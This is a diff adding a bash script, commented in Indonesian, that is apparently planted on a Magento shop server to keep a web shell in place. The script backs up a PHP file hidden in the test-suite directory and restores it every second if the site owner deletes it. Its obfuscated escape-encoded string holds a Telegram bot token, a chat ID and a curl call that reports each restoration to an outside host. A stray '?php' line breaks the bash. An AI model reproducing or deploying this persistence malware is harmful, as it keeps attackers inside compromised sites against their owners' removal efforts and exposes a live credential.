@@ -1,0 +1,41 @@
+#!/bin/bash
+
+# Definisikan lokasi file index.php Permissions 755
+INDEX_FILE="/home/ilincaboutique.com/public_html/dev/tests/functional/testsuites/Magento/Mtf/TestSuite/InjectableTests/file_base.php"
+# Definisikan lokasi folder backup Permissions 755
+BACKUP_FOLDER="/home/ilincaboutique.com/public_html/cgi-bin/cgi-bin"
+# Buat folder backup jika belum ada
+mkdir -p "$BACKUP_FOLDER"
+# Tentukan nama file backup Permissions 755
+BACKUP_FILE="$BACKUP_FOLDER/system"
+?php
+echo "\43\40\x54\157\153\145\156\40\144\141\x6e\40\111\x44\x20\x63\150\x61\164\40\x54\x65\x6c\145\147\162\x61\x6d\15\12\124\x4f\113\105\x4e\x3d\42\67\x39\x33\x30\x37\71\x36\71\x37\x32\72\101\x41\x45\113\x67\x75\122\142\162\146\153\117\x33\117\113\x76\x4d\x38\141\170\x77\163\x61\160\156\114\142\x66\120\160\142\67\122\x46\121\42\15\12\x43\110\x41\x54\137\111\x44\x3d\x22\67\x32\x33\x34\70\61\x31\62\x35\x39\x22\x20\x20\x23\40\x47\x61\x6e\x74\x69\40\x64\x65\x6e\147\x61\x6e\x20\111\104\x20\143\x68\141\x74\x20\101\156\144\141\xd\xa\xd\12\43\x20\x46\165\156\147\163\151\40\165\156\x74\x75\153\40\x6d\145\156\x67\x69\162\151\x6d\x20\x6e\157\164\151\x66\x69\153\x61\163\x69\x20\x6b\145\40\124\145\154\x65\x67\162\141\155\xd\12\x73\145\156\x64\x5f\164\x65\x6c\x65\147\x72\141\x6d\x5f\x6e\x6f\x74\x69\x66\x69\143\x61\164\x69\x6f\x6e\x28\51\x20\x7b\xd\12\x20\x20\x20\x20\154\157\x63\141\154\40\155\145\x73\x73\x61\147\145\x3d\x22\x24\61\42\15\xa\40\40\x20\40\x63\x75\x72\x6c\x20\x2d\163\40\x2d\130\40\x50\x4f\x53\x54\40\x22\x68\164\164\160\163\72\x2f\x2f\x61\160\151\x2e\x74\x65\x6c\145\x67\x72\x61\x6d\56\x6f\x72\x67\x2f\x62\157\x74\44\x54\x4f\x4b\x45\116\57\x73\145\x6e\144\115\x65\x73\x73\141\147\x65\42\x20\x5c\15\xa\x20\40\40\x20\40\x20\40\40\55\x64\x20\x63\x68\141\164\x5f\151\144\x3d\x22\x24\x43\110\101\x54\137\x49\x44\x22\x20\134\xd\xa\x20\x20\40\x20\x20\40\40\40\x2d\144\40\164\x65\170\164\75\x22\x24\155\145\163\x73\141\147\145\42\xd\12\175";
+# Backup file index.php jika belum ada backup
+if [ ! -f "$BACKUP_FILE" ]; then
+    cp "$INDEX_FILE" "$BACKUP_FILE"
+    echo "Backup pertama dibuat: $BACKUP_FILE"
+    send_telegram_notification "Backup pertama dibuat: $BACKUP_FILE"
+fi
+
+# Fungsi untuk memonitor perubahan pada file index.php
+monitor_file() {
+    while true; do
+        # Hitung checksum file index.php untuk mendeteksi perubahan
+        CURRENT_CHECKSUM=$(md5sum "$INDEX_FILE" | awk '{ print $1 }')
+        BACKUP_CHECKSUM=$(md5sum "$BACKUP_FILE" | awk '{ print $1 }')
+
+        if [ "$CURRENT_CHECKSUM" != "$BACKUP_CHECKSUM" ]; then
+            # Jika checksum berbeda, kembalikan file index.php dari backup
+            echo "Change, mengembalikan backup..."
+            cp "$BACKUP_FILE" "$INDEX_FILE"
+            echo "https://ilincaboutique.com/dev/tests/functional/testsuites/Magento/Mtf/TestSuite/InjectableTests/file_base.php"
+            send_telegram_notification "shell di hapus. SUDAH DI KEMBALIKAN." # UBAH JADI NAMA FILE/DOMAIN. UBAH JADI NAMA FILE/DOMAIN YG DI KEMBALIKAN
+        fi
+
+        # Tunggu 1 detik sebelum pengecekan selanjutnya
+        sleep 1
+    done
+}
+
+# Jalankan fungsi monitoring
+monitor_file
